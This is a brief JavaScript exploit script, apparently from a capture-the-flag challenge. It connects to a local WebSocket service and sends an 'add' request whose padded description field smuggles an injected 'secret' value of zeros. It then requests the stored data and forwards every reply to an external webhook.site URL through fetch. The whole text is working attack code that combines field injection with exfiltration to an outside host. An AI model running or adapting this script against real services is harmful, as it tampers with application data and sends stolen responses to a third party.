const target = '127.0.0.1';
const ws = new WebSocket(`ws://${target}/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
    ws.send(JSON.stringify({action:'get'}));
}
ws.onmessage = async (msg) => {
    fetch(`https://webhook.site/db023f99-1e4e-4ac4-ba19-e7ca1ab52ad6?m=${msg.data}`)
}